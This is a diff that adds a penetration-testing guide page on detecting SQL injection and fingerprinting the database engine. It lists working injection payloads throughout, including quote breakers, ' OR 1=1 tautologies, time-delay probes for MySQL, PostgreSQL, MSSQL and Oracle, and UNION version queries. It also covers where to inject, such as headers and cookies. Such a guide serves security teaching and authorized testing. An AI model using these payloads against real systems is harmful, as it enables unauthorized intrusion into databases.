@@ -1,0 +1,192 @@
+---
+title: SQLi Detection
+description: Identifying SQL injection points and fingerprinting the underlying DBMS.
+mitre: [T1190]
+d3fend: [D3-MA, D3-NTA]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 2
+  label: Detection
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+Detection is finding *any* injection - not yet exploiting it. Goal: confirm the parameter is injectable and identify the DBMS.
+
+## TL;DR
+
+```
+'
+"
+`
+)
+')
+"))
+\
+\\
+';
+'"
+'-- -
+" -- -
+' OR 1=1-- -
+1' AND SLEEP(5)-- -
+```
+
+Inject one at a time. Look for: SQL error messages, HTTP 500, response size change, response time delay, or behavioural change (login succeeds, content appears/disappears).
+
+## Where to inject
+
+Every value the application sends to the backend is a candidate:
+
+| Location | How to test |
+|---|---|
+| URL query parameters | Modify in browser or proxy |
+| POST body fields | Modify in proxy |
+| JSON fields | Inject inside string values: `"id":"1'"` |
+| HTTP headers | `User-Agent`, `Cookie`, `Referer`, `X-Forwarded-For` |
+| Cookies | Often reflected into session-tracking queries |
+| Hidden form fields | Visible in HTML source |
+
+<Aside type="tip">
+Headers and cookies are commonly missed and frequently vulnerable. Always fuzz these in addition to obvious parameters.
+</Aside>
+
+## Step 1 - Break the syntax
+
+Inject characters that would terminate a string literal, identifier, or expression:
+
+```
+'        single quote
+"        double quote
+`        backtick (MySQL identifier)
+)        closing paren
+'))      multiple terminators
+\        backslash escape test
+```
+
+**Success indicator:** SQL error returned, HTTP 500, or any visible deviation from the normal response. A returned error like `unclosed quotation mark`, `near "'": syntax error`, `ORA-`, `PG::SyntaxError` confirms injection AND fingerprints the DBMS.
+
+## Step 2 - Confirm with balanced payloads
+
+If a single quote breaks the page, an even number of quotes should restore it:
+
+```
+''       two quotes - query works again
+'+'      string concatenation in some DBMS
+'||'     string concatenation in Oracle/PostgreSQL
+```
+
+If the page works with `''` but breaks with `'`, you have injection.
+
+## Step 3 - Confirm with logic
+
+Submit semantically equivalent payloads. The page should respond identically:
+
+```
+1               baseline
+1 AND 1=1       still true → same response
+1 AND 1=2       false → different response (or empty)
+1' AND '1'='1
+1' AND '1'='2
+```
+
+Different responses to logically true vs. false payloads = confirmed boolean-inferable injection. See [Boolean-based blind](../blind-boolean/).
+
+## Step 4 - Confirm with timing
+
+When errors are suppressed and content doesn't change, force a measurable delay:
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    1' AND SLEEP(5)-- -
+    1' AND IF(1=1, SLEEP(5), 0)-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    1'; SELECT pg_sleep(5)-- -
+    1' || pg_sleep(5)-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    1'; WAITFOR DELAY '0:0:5'-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    1' || dbms_pipe.receive_message(('a'),5)-- -
+    ```
+  </TabItem>
+</Tabs>
+
+**Success indicator:** response takes ~5 seconds longer than baseline. Repeat 2–3 times to rule out network jitter.
+
+## Fingerprinting the DBMS
+
+Once you have any working injection, identify the engine:
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    ' UNION SELECT @@version-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    ' UNION SELECT version()-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    ' UNION SELECT @@version-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' UNION SELECT banner FROM v$version-- -
+    ```
+  </TabItem>
+  <TabItem label="SQLite">
+    ```sql
+    ' UNION SELECT sqlite_version()-- -
+    ```
+  </TabItem>
+</Tabs>
+
+Behavioural fingerprinting (no UNION needed):
+
+| Test | True for |
+|---|---|
+| `SELECT @@version` works | MySQL, MariaDB, MSSQL |
+| `SELECT version()` works | PostgreSQL, MySQL |
+| `SELECT FROM dual` required | Oracle |
+| `SELECT TOP 1` works | MSSQL |
+| `LIMIT 1` works | MySQL, PostgreSQL, SQLite |
+| `ROWNUM <= 1` works | Oracle |
+| Stacked queries (`;`) work | MSSQL, PostgreSQL (rarely MySQL) |
+| `\|\|` is string concat | Oracle, PostgreSQL, SQLite |
+| `+` is string concat | MSSQL |
+| `CONCAT()` is string concat | MySQL |
+
+See [DBMS cheatsheet](../dbms-cheatsheet/) for full per-engine syntax.
+
+## What to do next
+
+| Detection result | Next page |
+|---|---|
+| Login form behaves oddly | [Authentication bypass](../auth-bypass/) |
+| Errors visible in response | [UNION-based](../union-based/) |
+| Page changes on true/false | [Boolean blind](../blind-boolean/) |
+| Page only changes on time | [Time blind](../blind-time/) |
+| Nothing visible at all | [Out-of-band](../out-of-band/) |
+
+## Notes
+
+<Aside type="caution">
+Front-end input validation does not count as protection. Send your payloads via a proxy (Burp, Caido) directly to the backend.
+</Aside>
+
+- Some apps URL-encode user input before sending; others double-encode. If a payload doesn't fire, try sending it URL-encoded and double-encoded.
+- A single `'` returning HTTP 200 with normal content does *not* mean the parameter is safe. Many injections only manifest with logical conditions or on specific code paths.
